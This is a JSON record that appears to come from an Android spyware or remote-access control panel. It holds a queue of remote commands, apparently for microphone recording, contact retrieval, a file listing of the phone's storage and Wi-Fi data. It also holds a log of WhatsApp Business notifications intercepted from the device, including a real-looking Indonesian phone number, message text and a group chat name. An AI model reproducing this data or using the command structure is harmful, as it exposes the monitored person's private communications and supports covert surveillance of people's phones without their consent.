{
  "clientID": "09f31c50-8098-4221-9284-38b17fb72270",
  "CommandQue": [
    {
      "sec": "2",
      "type": "0xMI",
      "uid": 2736
    },
    {
      "type": "0xCO",
      "uid": 1929
    },
    {
      "action": "ls",
      "path": "/storage/emulated/0",
      "type": "0xFI",
      "uid": 353
    },
    {
      "type": "0xWI",
      "uid": 5413
    }
  ],
  "SMSData": [],
  "CallData": [],
  "contacts": [],
  "wifiNow": [],
  "wifiLog": [],
  "clipboardLog": [],
  "notificationLog": [
    {
      "appName": "com.whatsapp.w4b",
      "title": "+62 822-9217-5457",
      "content": "Trus apa bang yg gampang",
      "postTime": 1723904749465,
      "key": "0|com.whatsapp.w4b|1|hRSbu6BNPnBvAYE5yoFkGZTDagFjYDHceVyvNIU9vgc=\n|10223",
      "hash": "163beb8fc310099d9e7ee7c7cb1ecead"
    },
    {
      "appName": "com.whatsapp.w4b",
      "title": "‎X-11 SENERITY.24-25 (8 pesan): Dafa",
      "content": "① Foto",
      "postTime": 1723904749524,
      "key": "0|com.whatsapp.w4b|1|9ADlWrdj70gQDGDTDrtxTE6nbpJThT4KWvb4t+lbEgE=\n|10223",
      "hash": "0e94cccef447704f25a86ad674360415"
    },
    {
      "appName": "com.whatsapp.w4b",
      "title": "WA Business",
      "content": "‎‎9 pesan dari 2 chat",
      "postTime": 1723904749533,
      "key": "0|com.whatsapp.w4b|1|null|10223",
      "hash": "5737e78d491e1bcbee4af3bc602536e7"
    }
  ],
  "enabledPermissions": [],
  "apps": [],
  "GPSData": [],
  "GPSSettings": {
    "updateFrequency": 0
  },
  "downloads": [],
  "currentFolder": []
}